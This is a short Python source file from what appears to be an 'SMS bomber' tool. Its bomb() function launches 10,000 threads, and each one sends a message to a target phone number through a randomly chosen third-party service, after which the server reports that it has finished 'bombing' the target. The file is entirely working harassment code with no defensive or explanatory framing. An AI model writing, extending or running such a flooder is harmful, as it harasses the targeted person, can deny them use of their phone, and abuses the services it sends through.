import threading
import API.SMS.sendRequest as request
import API.SMS.randomData as randomData

__services = request.getServices()

def worker(target):
    service = randomData.random_service(__services)
    service = request.Service(service)
    response = service.sendMessage(target)
    if response == None:
        pass
    else:
        print(response)

async def bomb(target):
    for i in range(10000):
        threading.Thread(target=worker, args=[target]).start()
    return {"SERVER HAS FINISHED BOMBING "+target}
